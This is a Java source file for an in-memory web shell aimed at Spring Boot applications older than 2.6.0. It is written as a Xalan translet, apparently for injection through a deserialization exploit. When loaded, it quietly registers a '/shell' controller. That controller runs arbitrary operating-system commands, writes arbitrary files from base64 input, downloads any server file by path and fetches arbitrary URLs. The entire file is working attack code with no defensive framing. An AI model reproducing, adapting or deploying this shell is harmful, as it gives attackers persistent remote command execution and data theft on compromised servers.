package memshell;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.tomcat.util.http.fileupload.IOUtils;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.lang.reflect.Method;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

//memshell when SpringBoot < 2.6.0
public class ControllerShell01 extends AbstractTranslet {
    static{


        try {
            System.out.println("start static ControllerShell01");

            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
            Method declaredMethod = Class.forName("memshell.ControllerShell01").getDeclaredMethod("login", HttpServletRequest.class, HttpServletResponse.class);
            PatternsRequestCondition url = new PatternsRequestCondition("/shell");
            RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
            RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
            r.registerMapping(info, Class.forName("memshell.ControllerShell01").newInstance(), declaredMethod);

            System.out.println("controller is been registered");


        } catch (ClassNotFoundException | NoSuchMethodException | InstantiationException | IllegalAccessException e) {
            throw new RuntimeException(e);
        }
    }

    public void login(HttpServletRequest request, HttpServletResponse response){
        try {
            String arg0 = request.getParameter("code");
            PrintWriter writer = response.getWriter();

            //任意文件写入
            String writePath = request.getParameter("writePath");
            String writeBytes = request.getParameter("writeBytes");
            if (writePath != null && writeBytes != null) {
                byte[] decode = Base64.getDecoder().decode(writeBytes);
                new FileOutputStream(writePath).write(decode);
            }

            String filePath = request.getParameter("file");
            if (filePath != null) {
                InputStream inputStream = new BufferedInputStream(Files.newInputStream(Paths.get(filePath)));
                response.setContentType("application/octet-stream");
                response.setHeader("Content-Disposition", "attachment; filename=\"" + filePath + "\"");
                response.setContentLength((int) Files.size(Paths.get(filePath)));
                IOUtils.copy(inputStream, response.getOutputStream());
            }

            //读文件，不会触发Runtime等
            String urlContent = "";
            String read = request.getParameter("read");
            if (read != null){
                final URL url = new URL(read);
                final BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
                String inputLine = "";
                while ((inputLine = in.readLine()) != null) {
                    urlContent = urlContent + inputLine + "\n";
                }
                in.close();
                writer.println(Base64.getEncoder().encodeToString(urlContent.getBytes()));
            }


            //命令执行
            if (arg0 != null) {
                String o = "";
                java.lang.ProcessBuilder p;
                if(System.getProperty("os.name").toLowerCase().contains("win")){
                    p = new java.lang.ProcessBuilder(new String[]{"cmd.exe", "/c", arg0});
                }else{
                    p = new java.lang.ProcessBuilder(new String[]{"/bin/sh", "-c", arg0});
                }
                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("\\A");
                o = c.hasNext() ? c.next(): o;
                c.close();
                writer.write(o);
                writer.flush();
                writer.close();
            }
        }catch (Exception e){
        }
    }





    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
